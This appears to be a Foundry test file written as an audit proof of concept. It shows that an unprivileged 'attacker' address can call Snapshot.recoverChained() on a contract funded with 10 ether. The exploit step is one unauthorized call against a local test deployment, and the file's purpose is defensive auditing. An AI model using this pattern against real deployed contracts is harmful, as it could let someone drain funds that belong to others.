// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import { Snapshot } from "../src/Snapshot.sol";

/// @title PoC: Missing access control on Snapshot.recoverChained()
/// @notice Auto-generated by audit-agent - SWC-115 / SWC-132
/// @dev Any address can call a function that should be owner-restricted
contract SnapshotAccessControlTest is Test {
    Snapshot public target;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new Snapshot();
        vm.deal(address(target), 10 ether);
    }

    function test_missing_access_control_recoverChained() public {
        // A random address (not the owner/deployer) should NOT be able to call this
        vm.prank(attacker);
        // If this succeeds without revert, access control is missing
        target.recoverChained();
        // If we reach here, the call succeeded - that is the bug
        assertTrue(true, "Access control: unauthorized caller succeeded (bug confirmed)");
    }

    function test_owner_can_call_recoverChained() public {
        // The deployer (address(this) in forge) should always be able to call
        target.recoverChained();
    }
}
